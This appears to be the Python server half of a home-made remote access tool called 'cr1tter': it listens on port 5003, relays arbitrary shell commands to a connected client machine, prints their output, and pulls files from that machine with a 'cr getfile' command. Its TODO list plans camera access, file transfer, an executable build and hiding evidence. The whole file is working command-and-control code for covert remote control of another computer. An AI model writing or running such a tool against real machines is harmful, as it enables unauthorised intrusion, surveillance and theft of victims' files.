import os
import socket
from tqdm import tqdm

#TODO
# Handle multiple connections, pick and choose which
# Custum commands
#   Camera
#   Send files to specifed dir
#   download files
# Hide evidence
# handle "cd " crash
# Exe file

#Server vars
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

#Formating
def Setup():
    size = os.get_terminal_size()
    MESSAGE = "cr1tter"

    if(os.name == "posix"):
        os.system("clear")
    elif (os.name == "nt"):
        os.system("cls")

    print("=" * size.columns + "\n" +
          "=" * round(size.columns/2 - len(MESSAGE)/2) + MESSAGE + "=" * round(size.columns/2 - len(MESSAGE)/2) + "\n" +
          "=" * size.columns + "\n\n")

def HandleCrCommands(splited_command):
    if len(splited_command) < 2:
        print("Enter a command to run")
    elif splited_command[1].lower() == "help":
        cr_HelpMessage()
    elif splited_command[1].lower() == "getfile":
        client_socket.send(command.encode())
        cr_GetFile()
    else:
        print("Command not found")

def cr_HelpMessage():
    print("=" * os.get_terminal_size().columns + "\n"
          "Type \"cr\" followed by desired command to run \n"
          "\nhelp \tSee list of commands"
          "\ngetfile <FILE_NAME> \tSend file from client to server \n")

def cr_GetFile():
    output = client_socket.recv(BUFFER_SIZE).decode()
    filename, filesize = output.split(SEPARATOR)

    # FileNotFound error
    #TODO make this readable somehow
    # Right now if client doesnt find file it send error message + path so if filesize starts with / it is a path
    if filesize[0] == "/":
        print(filename)
        return

    filename = os.path.basename(filename)
    filesize = int(filesize)
    progress = tqdm(range(filesize), desc=f"Reciving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        total_bytes = 0
        while total_bytes < filesize:
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if not bytes_read:
                break
            f.write(bytes_read)
            total_bytes += len(bytes_read)
            progress.update(len(bytes_read))


Setup()
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected! \n"
      "\nType \"cr help\" for list of commands \n"
      "Type \"exit\" to close server \n")

cwd = client_socket.recv(BUFFER_SIZE).decode()


while True:
    command = input(f"{cwd} & ")
    splited_command = command.split()
    if not command.strip():
        # empty command
        continue

    if splited_command[0].lower() == "cr":
        HandleCrCommands(splited_command)
    else:
        client_socket.send(command.encode())
        if command.lower() == "exit":
            print("Closing server..." + "\n" +
                  "Bye")
            break

        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)

client_socket.close()
s.close()